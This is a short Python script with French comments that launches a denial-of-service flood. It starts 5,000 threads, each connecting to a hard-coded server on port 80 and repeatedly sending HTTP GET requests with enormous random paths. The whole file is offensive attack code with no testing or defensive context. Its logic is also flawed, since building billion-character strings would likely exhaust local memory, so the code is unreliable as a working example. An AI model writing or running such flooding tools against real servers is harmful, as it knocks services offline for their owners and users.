import socket
import threading
import random
import string

HOST = '192.168.164.129'  # Remplacez par l'adresse IP ou le nom de domaine du serveur
PORT = 80  # Remplacez par le port du serveur

def create_connection():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        print(f"Connexion établie depuis le thread {threading.current_thread().name}")

        # Générer une chaîne de caractères aléatoire
        random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=1000000000))

        # Envoyer la requête avec la chaîne de caractères aléatoire
        request = f"GET /{random_string*3} HTTP/1.1\r\nHost: {HOST}\r\n\r\n"
        for _ in range(1000000000):
            s.sendall(request.encode())
            
        print(f"Requête envoyée depuis le thread {threading.current_thread().name}")

threads = []

for _ in range(5000):
    t = threading.Thread(target=create_connection)
    t.start()
    threads.append(t)

for thread in threads:
    thread.join()

print("Toutes les connexions sont terminées.")